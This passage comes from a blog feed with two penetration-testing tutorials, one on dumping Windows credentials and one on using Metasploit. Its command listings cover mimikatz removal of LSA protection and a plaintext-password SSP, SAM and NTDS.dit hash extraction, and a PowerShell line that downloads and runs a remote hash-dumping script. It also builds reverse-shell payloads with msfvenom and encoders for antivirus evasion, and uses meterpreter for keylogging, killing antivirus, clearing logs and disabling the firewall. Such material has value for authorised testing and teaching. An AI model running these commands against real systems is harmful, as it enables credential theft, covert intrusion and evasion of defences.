<p><a class="link"   href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/DumpLsass.cs" >DumpLsass.cs<i class="fas fa-external-link-alt"></i></a> will create <code>lsass.exe</code> dump file in the current dir after running, needs to compile by <code>csc.exe</code>. </p>
<h4 id="Limited-Download-Length"><a href="#Limited-Download-Length" class="headerlink" title="Limited Download Length"></a>Limited Download Length</h4><p>Sometime we cannot download big dump file that easily, so we export credentials on target, and download the credentials.<br>We have <a class="link"   href="https://github.com/3gstudent/Homework-of-C-Sharp/blob/master/SafetyKatz.cs" >SafetyKatz<i class="fas fa-external-link-alt"></i></a>.<br>Compile it.</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v3.<span class="number">5</span>\csc.exe SafetyKatz.cs /unsafe</span><br><span class="line"><span class="comment">#or</span></span><br><span class="line">&gt; C:\Windows\Microsoft.NET\Framework64\v4.<span class="number">0.30319</span>\csc.exe SafetyKatz.cs /unsafe</span><br></pre></td></tr></table></figure>

<h4 id="LSA-Protection"><a href="#LSA-Protection" class="headerlink" title="LSA Protection"></a>LSA Protection</h4><p>Microsoft added <code>LSA protection</code> policy on March 12, 2014 to prevent injection to <code>lsass.exe</code>. Add a DWORD(32) <code>RunAsPPL</code> with value <code>00000001</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa</span><br></pre></td></tr></table></figure>
<p>To bypass it, we can read <code>SAM</code> on disk.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::whoami</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br></pre></td></tr></table></figure>
<p><code>mimikatz</code> also use <code>mimidrv.sys</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # !+</span><br><span class="line">mimikatz # !processprotect /process:lsass.exe /remove</span><br></pre></td></tr></table></figure>

<h4 id="Credential-Guard"><a href="#Credential-Guard" class="headerlink" title="Credential Guard"></a>Credential Guard</h4><p>on Windows 10 and Windows Server 2016, Microsoft implements <code>Credential Guard</code>, which is based on virtualization technology and isolating the <code>lsass</code> process to protect credentials. With <code>Credential Guard</code>, lsass consists of two process: normal LSA ,and isolated LSA that running in VM.<br>Reading <code>SAM</code> on disk still bypass.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # token::whoami</span><br><span class="line">mimikatz # token::elevate</span><br><span class="line">mimikatz # lsadump::sam</span><br></pre></td></tr></table></figure>
<p>Or using <code>SSP</code> which is the software called when user logs, and receives user credentials. <code>SSP</code> will be loaded in <code>lsass.exe</code> process after system booting.<br><code>mimikatz</code> can install custom <code>SSP</code> through memory, edit <code>lsass</code> memory and extract credentials in it.<br>After executing <code>misc::memssp</code> in <code>mimikatz</code>, if some user login, <code>mimilsa.log</code> ,with user plain password in it, will be created in <code>c:\windows\system32</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # misc::memssp</span><br></pre></td></tr></table></figure>

<p>Note:<br>Despite that, try <code>lsadump::secrets</code> to get <code>syskey</code> in the registry to decrypt. <code>PwDump7</code>, <code>QuarksPwDump</code> and other tools are also useful to bypass LSA Protection and Credential Guard.<br>If cmd, regedit and taskmgr are also disabled, <code>mimikatz</code> can still get over it.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # privilege::debug</span><br><span class="line">mimikatz # misc::cmd</span><br><span class="line">mimikatz # misc::regedit</span><br><span class="line">mimikatz # misc::taskmgr</span><br></pre></td></tr></table></figure>


<h3 id="From-SAM-File"><a href="#From-SAM-File" class="headerlink" title="From SAM File"></a>From <code>SAM</code> File</h3><p>As I mentioned, <code>SAM</code> file saves password hash of the <code>Workgroup</code>, so we can extract something from it, like from <code>lsass.exe</code>. What you get is only local users’ or logged in users’ hashes.</p>
<p>Export <code>SAM</code> file data:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; reg save HKLM\SYSTEM SYSTEM</span><br><span class="line">&gt; reg save HKLM\SAM SAM</span><br></pre></td></tr></table></figure>
<p>Use <code>mimikatz</code> to extract hash:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mimikatz # lsadump::sam /sam:SAM /system:SYSTEM</span><br></pre></td></tr></table></figure>

<h3 id="From-NTDS-dit-File"><a href="#From-NTDS-dit-File" class="headerlink" title="From NTDS.dit File"></a>From <code>NTDS.dit</code> File</h3><p>I also mentioned in <code>Domain</code>, <code>NTDS.dit</code> stores all <code>Domain Member</code> password hashes (For <code>Domain Controller</code>).</p>
<p>Export <code>NTDS.dit</code> data:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; ntdsutil <span class="string">&quot;ac i ntds&quot;</span> ifm <span class="string">&quot;create full c:\users\tmp&quot;</span> q q</span><br></pre></td></tr></table></figure>
<p>Then use <a class="link"   href="https://github.com/zcgonvh/NTDSDumpEx/releases" >NTDSDumpEx<i class="fas fa-external-link-alt"></i></a> to extract user hashes:</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; <span class="built_in">cd</span> c:\users\tmp</span><br><span class="line">&gt; NTDSDumpEx <span class="literal">-d</span> ntds.dit <span class="literal">-s</span> system <span class="literal">-o</span> domain.txt</span><br></pre></td></tr></table></figure>
<p>Another util – <a class="link"   href="https://raw.githubusercontent.com/SecureAuthCorp/impacket/master/impacket/examples/secretsdump.py" >secretsdump<i class="fas fa-external-link-alt"></i></a> of Python library <code>impacket</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; python secretsdump.py -system SYSTEM -ntds ntds.dit local</span><br></pre></td></tr></table></figure>
<p>It is really powerful, can extract hashes in both <code>SAM</code> and in <code>Domain</code>. </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; python secretsdump.py user_name:password@target_ip</span><br></pre></td></tr></table></figure>


<h3 id="Tools-to-Capture-Hash"><a href="#Tools-to-Capture-Hash" class="headerlink" title="Tools to Capture Hash"></a>Tools to Capture Hash</h3><ul>
<li><p><code>mimikatz</code> is more than just capturing the hashes. See <a class="link"   href="https://github.com/gentilkiwi/mimikatz/wiki" >Wiki<i class="fas fa-external-link-alt"></i></a> to find more help.</p>
</li>
<li><p>Powershell pentest framework like <code>nishang</code> usually have useful scripts to get hashes:<code>powershell iex (New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/samratashok/nishang/master/Gather/Get-PassHashes.ps1&#39;);Get-PassHashes</code></p>
</li>
<li><p>As for <code>metasploit</code>, <code>meterpreter</code> has some built-in cmds:</p>
  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/hashdump</span><br><span class="line">meterpreter &gt; run hashdump</span><br><span class="line">meterpreter &gt; run post/windows/gather/smart_hashdump</span><br></pre></td></tr></table></figure>
<p>  load <code>mimikatz</code> to do more:</p>
  <figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; load mimikatz   <span class="comment"># necessary</span></span><br><span class="line">meterpreter &gt; msv</span><br><span class="line">meterpreter &gt; tspkg</span><br><span class="line">meterpreter &gt; wdigest</span><br><span class="line">meterpreter &gt; kerberos</span><br><span class="line">meterpreter &gt; ssp</span><br><span class="line">meterpreter &gt; mimikatz_command -f samdump::hashes</span><br></pre></td></tr></table></figure>
</li>
<li><p>Windows Credentials Editor (WCE) is also famous to do intranet pentest. Download <a class="link"   href="https://www.ampliasecurity.com/research/wce_v1_42beta_x32.zip" >x32<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://www.ampliasecurity.com/research/wce_v1_42beta_x64.zip" >x64<i class="fas fa-external-link-alt"></i></a> or <a class="link"   href="https://www.ampliasecurity.com/research/wce_v1_41beta_universal.zip" >universal<i class="fas fa-external-link-alt"></i></a>.</p>
</li>
<li><p><a href="https://github.com/quarkslab/quarkspwdump"><code>Quarks PwDump</code></a> is kind of old, which used to be a stabe hash capturer.</p>
</li>
<li><p><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procdump"><code>ProcDump</code></a> belongs to Windows Sysnternals Suite, which belongs to Microsoft now. Therefore it is able to bypass some antivirus softwares. Working with &#96;mimikatz is talked <a href="#Normal-Ways">before</a></p>
</li>
<li><p><code>SqlDumper.exe</code> is belong to Microsoft and exists in SQL Server directory, also capable for bypassing antivirus software.It is stored in <code>C:\Program Files\Microsoft SQL Server\number\Shared</code> by default, but if SQL Server is uninstalled, you have to upload. Use it like:</p>
  <figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&gt; tasklist /svc | findstr lsass.exe  <span class="comment"># see lsass.exe PID</span></span><br><span class="line">&gt; Sqldumper.exe ProcessID <span class="number">0</span> <span class="number">0</span>x01100  <span class="comment"># export dump hash</span></span><br><span class="line"><span class="comment"># then use mimmikatz (same OS version needed) to extract hash </span></span><br><span class="line">&gt; mimikatz.exe <span class="string">&quot;sekurlsa::minidump SQLDmpr0001.mdmp&quot;</span> <span class="string">&quot;sekurlsa::logonPasswords full&quot;</span> <span class="keyword">exit</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>pentest</tag>
        <tag>domain</tag>
      </tags>
  </entry>
  <entry>
    <title>MSF Pentest Route</title>
    <url>/2020/03/17/2020-03-17-MSF-Pentest-Route/</url>
    <content><![CDATA[<p>Nowadays we have plenty of mature pentest framework that can benefit us from information gathering to penetration testing persistence.</p>
<h2 id="Metasploit-Framework-Introduction"><a href="#Metasploit-Framework-Introduction" class="headerlink" title="Metasploit Framework Introduction"></a>Metasploit Framework Introduction</h2><p>The most famous one for sure. It can be easily found on <a class="link"   href="https://github.com/rapid7/metasploit-framework" >Github<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://www.metasploit.com/" >Official Site<i class="fas fa-external-link-alt"></i></a>. It is maintained in kali repository.</p>
<p>Here is the whole architecture:<br><img src="/imghost/mpr/1.png" alt="architecture"></p>
<p>Well, best way to learn a tool is to read <a class="link"   href="https://github.com/rapid7/metasploit-framework/wiki" >official reference<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/rapid7/metasploit-framework" >source code<i class="fas fa-external-link-alt"></i></a>.</p>
<p>Here I want to introduce just the usage, not detailed interpretation, architecture analysis and plugin development.</p>
<p>There are 6 corresponding modules:<br><code>auxiliary</code> responsible for info gathering, scanning, sniffing, fingerprint (banner) recognition, password guessing, Dos etc.<br><code>exploit</code> responsible for exploiting system vulnerabilities to attack.<br><code>payloads</code> responsible for control target after successfully exploiting. Include 3 types:</p>
<ul>
<li>single: all-in-one, a complete pack without dependencies on other packages</li>
<li>stagers: transfer a small payload for early connection</li>
<li>stages: use stagers connection to download later payload</li>
</ul>
<p><code>encoder</code> responsible for encode payload to bypass AntiVirus<br><code>nop</code> responsible for improving payload stability and maintaining size<br><code>post</code> responsible for post pentest, like getting seneitive info, attack via springboards.</p>
<h2 id="Database-Preparation"><a href="#Database-Preparation" class="headerlink" title="Database Preparation"></a>Database Preparation</h2><p>MSF use <code>PostgreSQL</code> to store reports and infos, and accelerate searching exp speed, but not necessary.</p>
<h3 id="Initialize-DB"><a href="#Initialize-DB" class="headerlink" title="Initialize DB"></a>Initialize DB</h3><p>Make sure you installed <code>PostgreSQL</code> before you want to use, and </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ systemctl start postgresql    <span class="comment"># start postgresql</span></span><br><span class="line">$ msfdb init                    <span class="comment"># initialize database</span></span><br><span class="line">$ msfdb                                              </span><br><span class="line">Manage the metasploit framework database                          </span><br><span class="line">  msfdb init     <span class="comment"># start and initialize the database              </span></span><br><span class="line">  msfdb reinit   <span class="comment"># delete and reinitialize the database            </span></span><br><span class="line">  msfdb delete   <span class="comment"># delete database and stop using it              </span></span><br><span class="line">  msfdb start    <span class="comment"># start the database                              </span></span><br><span class="line">  msfdb stop     <span class="comment"># stop the database                              </span></span><br><span class="line">  msfdb status   <span class="comment"># check service status                            </span></span><br><span class="line">  msfdb run      <span class="comment"># start the database and run msfconsole          </span></span><br><span class="line"><span class="comment"># or edit /usr/share/metasploit-framework/config/database.yml  </span></span><br></pre></td></tr></table></figure>
<p>After initialization, we check the status</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ msfconsole</span><br><span class="line">...</span><br><span class="line">msf &gt; db_status</span><br><span class="line">[*] postgresql connected to msf <span class="comment"># and that&#x27;s it</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># connect manually</span></span><br><span class="line">msf &gt; db_disconnect </span><br><span class="line">msf &gt; db_status </span><br><span class="line">[*] postgresql selected, no connection</span><br><span class="line">msf &gt; db_connect</span><br><span class="line">[*]    Usage: db_connect &lt;user:pass&gt;@&lt;host:port&gt;/&lt;database&gt;</span><br><span class="line">[*]       OR: db_connect -y [path/to/database.yml]</span><br><span class="line">[*] Examples:</span><br><span class="line">[*]        db_connect user@metasploit3</span><br><span class="line">[*]        db_connect user:pass@192.168.0.2/metasploit3</span><br><span class="line">[*]        db_connect user:pass@192.168.0.2:1500/metasploit3</span><br><span class="line">msf &gt; db_connect -y /usr/share/metasploit-framework/config/database.yml </span><br><span class="line">[*] Rebuilding the module cache <span class="keyword">in</span> the background...</span><br><span class="line">msf &gt; db_status </span><br><span class="line">[*] postgresql connected to msf</span><br></pre></td></tr></table></figure>
<h3 id="Use-DB"><a href="#Use-DB" class="headerlink" title="Use DB"></a>Use DB</h3><p>About how to utilize db, we always import data from other tools, then analyze it.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># import nmap report (nmap &#x27;-oX&#x27; to produce)</span></span><br><span class="line"><span class="comment"># or use dbnmap straightly in msfconsole</span></span><br><span class="line">msf &gt;  db_import /root/report  </span><br><span class="line">[*] Importing <span class="string">&#x27;Nmap XML&#x27;</span> data</span><br><span class="line">[*] Import: Parsing with <span class="string">&#x27;Nokogiri v1.8.5&#x27;</span></span><br><span class="line">[*] Importing host xx.xx.xx.xx</span><br><span class="line">[*] Successfully imported /root/report</span><br><span class="line"></span><br><span class="line"><span class="comment"># show host list</span></span><br><span class="line">msf &gt; hosts</span><br><span class="line">...</span><br><span class="line"><span class="comment"># show services</span></span><br><span class="line">msf &gt; services </span><br><span class="line">...</span><br><span class="line"><span class="comment"># show password database</span></span><br><span class="line">msf5 &gt; loot </span><br><span class="line">...</span><br><span class="line"><span class="comment"># show vulnerabilities based on former scanner results</span></span><br><span class="line">msf5 &gt; vulns </span><br><span class="line">...</span><br><span class="line">msf &gt; <span class="comment"># &#x27;-h&#x27; to see how to filter results</span></span><br></pre></td></tr></table></figure>

<h2 id="Basic-Commands"><a href="#Basic-Commands" class="headerlink" title="Basic Commands"></a>Basic Commands</h2><p>Use <code>msfconsole</code> to enter MSF, you can add parameters allowed in <code>msfconsole -h</code>. </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ msfconsole -h</span><br><span class="line">Usage: msfconsole [options]</span><br><span class="line"></span><br><span class="line">Common options:</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>MSF seperates different pen-task with the <code>workspace</code> concept.<br>Different <code>workspace</code> may contain different global variables.</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf &gt; workspace -h</span><br><span class="line">Usage:</span><br><span class="line">    workspace                  List workspaces</span><br><span class="line">    workspace -v               List workspaces verbosely</span><br><span class="line">    workspace [name]           Switch workspace         </span><br><span class="line">    workspace -a [name] ...    Add workspace(s)</span><br><span class="line">    workspace -d [name] ...    Delete workspace(s)</span><br><span class="line">    workspace -D               Delete all workspaces</span><br><span class="line">    workspace -r &lt;old&gt; &lt;new&gt;   Rename workspace</span><br><span class="line">    workspace -h               Show this <span class="built_in">help</span> information</span><br><span class="line">msf &gt;</span><br></pre></td></tr></table></figure>
<p>In MSF use <code>help</code> to see all commands</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    banner        Display an awesome metasploit banner</span><br><span class="line">    <span class="built_in">cd</span>            Change the current working directory</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<ul>
<li><code>banner</code> is for showing msf info.</li>
<li><code>exit</code> is to quit msf to shell.</li>
<li><code>use</code> is to select modules that I mentioned before.</li>
<li><code>back</code> is for reselection when entered a wrong module.</li>
<li><code>info</code> is for information of modules, like user, options, exploiting condition and available payloads.</li>
<li><code>set</code> and <code>unset</code> are for setting options of a module.</li>
<li><code>setg</code> and <code>unsetg</code> are for global options.</li>
<li><code>search</code> is to find modules with some features. Use <code>search -h </code> to see detailed usage.</li>
<li><code>route</code> is to set proxy&#x2F;springboard in post pentest. Use <code>route -h</code> to do more.</li>
<li><code>sessions</code> is to manage shells. Use <code>sessions -h</code> to see more.</li>
<li><code>show</code> is to give suitable payload&#x2F;encoder&#x2F;option etc. (for specific module we <code>use</code>), like <code>show payloads</code>&#x2F;<code>show encoders</code>&#x2F;<code>show options</code>. Use <code>show -h</code> to see more.</li>
<li><code>run</code> or <code>exploit</code> to attack, and after that normally you will get a reverse shell, or a better one –&gt; <code>meterpreter</code> shell with advanced functions.</li>
</ul>
<h2 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h2><p>If you have no exp to use, make a shellcode to let target execute.<br><code>msfvenom</code> is part of MSF, used for generate shellcode&#x2F;payload. </p>
<h3 id="Help-Page"><a href="#Help-Page" class="headerlink" title="Help Page"></a>Help Page</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ msfvenom -h</span><br><span class="line">MsfVenom - a Metasploit standalone payload generator.</span><br><span class="line">Also a replacement for msfpayload and msfencode.</span><br><span class="line">Usage: /usr/bin/msfvenom [options] &lt;var=val&gt;</span><br><span class="line">Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;IP&gt; -f exe -o payload.exe</span><br><span class="line"></span><br><span class="line">Options:</span><br><span class="line">    -l, --list            &lt;type&gt;     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all</span><br><span class="line">    -p, --payload         &lt;payload&gt;  Payload to use (--list payloads to list, --list-options for arguments). Specify &#x27;-&#x27; or STDIN for custom</span><br><span class="line">        --list-options               List --payload &lt;value&gt;&#x27;s standard, advanced and evasion options</span><br><span class="line">    -f, --format          &lt;format&gt;   Output format (use --list formats to list)</span><br><span class="line">    -e, --encoder         &lt;encoder&gt;  The encoder to use (use --list encoders to list)</span><br><span class="line">        --sec-name        &lt;value&gt;    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string</span><br><span class="line">        --smallest                   Generate the smallest possible payload using all available encoders</span><br><span class="line">        --encrypt         &lt;value&gt;    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)</span><br><span class="line">        --encrypt-key     &lt;value&gt;    A key to be used for --encrypt</span><br><span class="line">        --encrypt-iv      &lt;value&gt;    An initialization vector for --encrypt</span><br><span class="line">    -a, --arch            &lt;arch&gt;     The architecture to use for --payload and --encoders (use --list archs to list)</span><br><span class="line">        --platform        &lt;platform&gt; The platform for --payload (use --list platforms to list)</span><br><span class="line">    -o, --out             &lt;path&gt;     Save the payload to a file</span><br><span class="line">    -b, --bad-chars       &lt;list&gt;     Characters to avoid example: &#x27;\x00\xff&#x27;</span><br><span class="line">    -n, --nopsled         &lt;length&gt;   Prepend a nopsled of [length] size on to the payload</span><br><span class="line">        --pad-nops                   Use nopsled size specified by -n &lt;length&gt; as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)</span><br><span class="line">    -s, --space           &lt;length&gt;   The maximum size of the resulting payload</span><br><span class="line">        --encoder-space   &lt;length&gt;   The maximum size of the encoded payload (defaults to the -s value)</span><br><span class="line">    -i, --iterations      &lt;count&gt;    The number of times to encode the payload</span><br><span class="line">    -c, --add-code        &lt;path&gt;     Specify an additional win32 shellcode file to include</span><br><span class="line">    -x, --template        &lt;path&gt;     Specify a custom executable file to use as a template</span><br><span class="line">    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread</span><br><span class="line">    -v, --var-name        &lt;value&gt;    Specify a custom variable name to use for certain output formats</span><br><span class="line">    -t, --timeout         &lt;second&gt;   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)</span><br><span class="line">    -h, --help                       Show this message</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>Show encoding (<code>-e xxx</code> to use) and encrypting (<code>--encrypt xxxxx</code> to use) methods:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ msfvenom --list encoders</span><br><span class="line"></span><br><span class="line">Framework Encoders [--encoder &lt;value&gt;]</span><br><span class="line">======================================</span><br><span class="line"></span><br><span class="line">    Name                          Rank       Description</span><br><span class="line">    ----                          ----       -----------</span><br><span class="line">    cmd/brace                     low        Bash Brace Expansion Command Encoder</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">$ msfvenom --list encrypt</span><br><span class="line"></span><br><span class="line">Framework Encryption Formats [--encrypt &lt;value&gt;]</span><br><span class="line">================================================</span><br><span class="line"></span><br><span class="line">    Name</span><br><span class="line">    ----</span><br><span class="line">    aes256</span><br><span class="line">    base64</span><br><span class="line">    rc4</span><br><span class="line">    xor</span><br></pre></td></tr></table></figure>

<h3 id="Examples"><a href="#Examples" class="headerlink" title="Examples"></a>Examples</h3><p>Examples for generate shellcode</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># normal type</span></span><br><span class="line">$ msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br><span class="line">$ msfvenom -p windows/meterpreter/reverse_tcp -f exe -o ./back.exe LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># encode type</span></span><br><span class="line">$ msfvenom -p &lt;payload&gt; -e &lt;encoder &gt; -i &lt;encoder <span class="built_in">times</span>&gt; -n &lt;nopsled&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br><span class="line">$ msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o ./back.exe LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># bundled with other files</span></span><br><span class="line">$ msfvenom -x &lt;template file&gt; -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br><span class="line">$ msfvenom -p windows/meterpreter/reverse_tcp -x template.exe -i 3 -e x86/shikata_ga_nai -f exe -o ./back.exe LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">$ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"><span class="comment"># MAC</span></span><br><span class="line">$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br><span class="line"><span class="comment"># PHP</span></span><br><span class="line">$ msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"><span class="comment"># Asp</span></span><br><span class="line">$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure>
<p>And we use <code>exploit/multi/handler‍‍</code> to receive shell</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> payload windows/meterpreter/reverse_tcp </span><br><span class="line">payload =&gt; windows/meterpreter/reverse_tcp</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lport xxxx</span><br><span class="line">lport =&gt; xxxx</span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[-] Exploit failed: The following options failed to validate: LHOST.</span><br><span class="line">[*] Exploit completed, but no session was created.</span><br><span class="line">msf exploit(multi/handler) &gt; <span class="built_in">set</span> lhost xx.xx.xx.xx</span><br><span class="line">lhost =&gt; xx.xx.xx.xx</span><br><span class="line">msf exploit(multi/handler) &gt; exploit </span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on xx.xx.xx.xx:xxxx </span><br><span class="line"><span class="comment"># after victim run the shellcode</span></span><br><span class="line">[*] Sending stage (180291 bytes) to x.x.x.x</span><br><span class="line">[*] Meterpreter session 1 opened (xx.xx.xx.xx:xxxx -&gt; x.x.x.x:xx) at xxxxxx</span><br><span class="line"></span><br><span class="line">meterpreter &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h2><p>Use <code>help</code> to see detailed help page</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    <span class="built_in">bg</span>                        Alias <span class="keyword">for</span> background</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>As it is an advanced shell, we can not only execute shell command, but do a lot more in intranet:</p>
<ol>
<li>Basic part</li>
</ol>
<ul>
<li><code>background</code> or <code>bg</code> is to switch current session to background. Use <code>sessions -i n</code> to recovery.</li>
<li><code>sysinfo</code> is to show system information.</li>
<li><code>idletime</code> shows the time since previous operation.</li>
<li><code>enumdesktops</code> is to show how many users logged.</li>
<li><code>cat</code> is to view file.</li>
<li><code>del</code> or <code>rm</code> is to delete file.</li>
<li><code>download</code> is for copy things to local.</li>
<li><code>upload</code> is to copy local file to victim.</li>
<li><code>search</code> is to search files on victim. Use <code>search -h</code> to know how to use.</li>
<li><code>edit</code> has the same usage as <code>vim</code> editor.</li>
<li><code>cd</code> and <code>pwd</code> are for moving in victim pc.</li>
<li><code>lcd</code> and <code>lpwd</code> are for moving in local.</li>
<li><code>ps</code> is to check all process.</li>
<li><code>getuid</code> is to view current user privilege.</li>
</ul>
<ol start="2">
<li>Advanced part</li>
</ol>
<ul>
<li><code>reboot</code> and <code>shutdown</code> is to control power. </li>
<li><code>getsystem</code> is used for privilege escalation to <code>system</code>.</li>
<li><code>hashdump</code> is for hash dumping. </li>
<li><code>execute</code> is for running software. Use single <code>execute</code> to see detailed functions.</li>
<li><code>migrate &lt;pid&gt;</code> is to migrate <code>meterpreter</code> process to a new process.</li>
<li><code>shell</code> is to get a cmd.</li>
<li><code>run killav</code> is to kill antivirus services. </li>
<li><code>run xxx</code> is to run msf scripts.</li>
<li><code>clearev</code> is to clean your ass.</li>
</ul>
<ol start="3">
<li>More monitoring</li>
</ol>
<ul>
<li><code>run getgui -e</code> is to start rdp.</li>
<li><code>run getgui -u username -p passwd</code>  is to add user.</li>
<li><code>run getgui -f xxxx -e</code> is to forward 3389 to port xxxx.</li>
<li><code>netsh advfirewall set allprofiles state off</code> is to stop firewall.</li>
<li><code>Webscan_list</code> </li>
<li><code>Webscan_stream</code>    </li>
<li><code>Webscan_chat</code>      </li>
<li><code>steal_token</code> is to steal token of specific pid.</li>
<li><code>use incognito</code> is to load <code>incognito</code> to steal token or fake user. </li>
<li><code>list_tokens –u</code> is to list user token.</li>
<li><code>list_tokens –g</code> is to list user group token.</li>
<li>Key board logger  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; keyscan_start </span><br><span class="line">meterpreter &gt; keyscan_dump </span><br><span class="line">meterpreter &gt; keyscan_stop </span><br></pre></td></tr></table></figure></li>
<li>Sniff  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use sniffer</span><br><span class="line">meterpreter &gt; sniffer_interfaces</span><br><span class="line">meterpreter &gt; sniffer_start 5</span><br><span class="line">meterpreter &gt; sniffer_dump 5 /tmp/1.pcap</span><br><span class="line">meterpreter &gt; sniffer_stop 5</span><br></pre></td></tr></table></figure></li>
<li><code>screenshot</code> or following  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">meterpreter &gt; use espia</span><br><span class="line">meterpreter &gt; screengrab</span><br></pre></td></tr></table></figure></li>
<li><code>run post/windows/gather/enum_chrome</code> is to get chrome cache.</li>
<li><code>run post/windows/gather/dumplinks</code> is to get latest file operation.</li>
<li><code>run post/windows/gather/enum_firefox</code> is to get firefox cache.</li>
<li><code>run post/windows/gather/enum_ie</code> is to get IE cache.</li>
<li><code>run post/windows/manage/enable_rdp</code> is to open port 3389</li>
</ul>
